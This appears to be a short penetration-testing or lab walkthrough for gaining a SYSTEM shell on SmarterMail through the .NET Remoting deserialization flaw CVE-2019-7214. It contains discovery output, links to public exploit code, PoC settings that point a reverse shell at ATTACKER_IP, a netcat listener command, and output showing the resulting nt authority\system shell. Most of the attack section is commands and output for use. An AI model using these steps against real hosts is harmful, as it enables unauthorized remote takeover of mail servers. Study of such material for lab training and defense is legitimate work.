# SmarterMail

SmarterMail can expose an administrative web interface and supporting services on Windows hosts. `CVE-2019-7214` against the .NET Remoting service yielded a shell as `NT AUTHORITY\SYSTEM`.

## Discovery

WhatWeb on the SmarterMail web port may show:

```text
http://TARGET:9998 [302 Found] ASP_NET[MVC5.2], Microsoft-IIS[10.0], RedirectLocation[/interface/root], UncommonHeaders[x-aspnetmvc-version]
http://TARGET:9998/interface/root [200 OK] ASP_NET[MVC5.2], HTML5, Microsoft-IIS[10.0], UncommonHeaders[x-aspnetmvc-version]
```

Browse to:

```text
http://TARGET:9998
```

Observed page:

```text
Welcome to SmarterMail
```

## CVE-2019-7214 RCE

References from the observed path:

```text
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/http/smartermail_rce.md
https://github.com/devzspy/CVE-2019-7214
```

The exploit targets SmarterMail deserialization in three endpoints. The working PoC used the exposed `.NET Remoting` service on TCP/17001.

Set the PoC values:

```python
HOST='TARGET'
PORT=17001
LHOST='ATTACKER_IP'
LPORT=80
```

Start a listener:

```bash
nc -nlvp 80
```

Run the exploit:

```bash
python3 cve-2019-7214.py
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
whoami
nt authority\system
PS C:\Windows\system32>
```

